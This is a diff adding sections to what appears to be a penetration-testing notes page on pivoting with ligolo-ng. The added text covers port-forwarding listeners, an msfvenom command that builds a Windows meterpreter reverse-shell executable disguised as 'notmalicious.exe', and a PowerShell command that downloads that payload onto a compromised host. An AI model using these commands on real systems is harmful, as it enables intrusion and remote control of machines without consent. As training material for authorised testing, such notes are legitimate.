@@ -37,7 +37,19 @@ Download the appropriate proxy file for our attacker machine and architecture an
 
 ***
 
+## Cheatsheet
+
+TODO
+
+***
+
 ## Basic Usage
+
+Let’s say we’ve compromised a web server and we see that the server has two network interfaces, one that is public-facing and accessible from our attacker machine and another that lets us access the internal network.
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:614/1*wxQowCJLfTpqBloaVCAavg.png" alt="" height="343" width="614"><figcaption></figcaption></figure>
+
+Of course, we would want that access to the internal network if we prefer to be able to enumerate from our own machine.
 
 {% stepper %}
 {% step %}
@@ -139,3 +151,78 @@ We can now access the network, but in order to catch reverse shells, do file tra
 
 ## Reverse Shells
 
+Let’s say that through newly obtained access to the internal network we’ve compromised a Windows host sitting at `172.16.5.35` and we want to catch reverse shell from that host. Here’s how that would go.
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*e9dCcfP7674BkFQi3ik55g.png" alt="" height="358" width="700"><figcaption></figcaption></figure>
+
+We can listen to ports on the agent and redirect connections to our attacking machine where we’re running the proxy.
+
+### Create a Listener
+
+We can accomplish this easily by the following command inside the ligolo-ng session:
+
+```bash
+listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
+```
+
+{% hint style="info" %}
+Creates a listener on the target machine where we're running the agent at port `1234` and redirects the traffic to port `4444` on our machine.
+{% endhint %}
+
+<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+
+### Payload Creation
+
+In order to catch a reverse shell, the payload needs to be directed to the IP and port of the machine where the listener is created.
+
+Here is a sample payload with msfvenom:
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.15 LPORT=1234 -f exe -o notmalicious.exe
+```
+{% endcode %}
+
+{% hint style="info" %}
+IP of the compromised web server and port of the listener we created.
+{% endhint %}
+
+Since that traffic is forwarded to port `4444` on our machine we can start up [metasploit](../exploitation-tools/metasploit/ "mention") and listen on that port in order to catch the connection from the shell.
+
+***
+
+## File Transfer
+
+In order to transfer files - it is recommended to - add another listener in order to keep things separate. This is also good in case you have remote code execution and have already used the first listener to catch a PowerShell reverse shell for example.
+
+### Create a Listener
+
+```bash
+listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
+```
+
+{% hint style="info" %}
+This command creates a listener on the compromised web server at port `1235` forwarding traffic to port `8000`. In this example, port `8000` is used as it's the default port for a python HTTP server.
+{% endhint %}
+
+Use `listener_list` to see all the listeners that have been added.
+
+### Start a Python Server
+
+Now we can start a Python server and pull the file onto the target host.
+
+{% code overflow="wrap" %}
+```powershell
+Invoke-WebRequest -Uri "http://172.16.5.15:1235/notmalicious.exe" -OutFile notmalicious.exe
+```
+{% endcode %}
+
+Press enter or click to view image in full size
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*MRRX5XUHNd0yH9tmyY_kyQ.png" alt="" height="142" width="700"><figcaption></figcaption></figure>
+
+Now with the file transferred over you can run your payload and catch the shell (pay attention to the LHOST).
+
+Press enter or click to view image in full size
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*lFvxZY7lCdiX7Ziq83JIpQ.png" alt="" height="259" width="700"><figcaption></figcaption></figure>
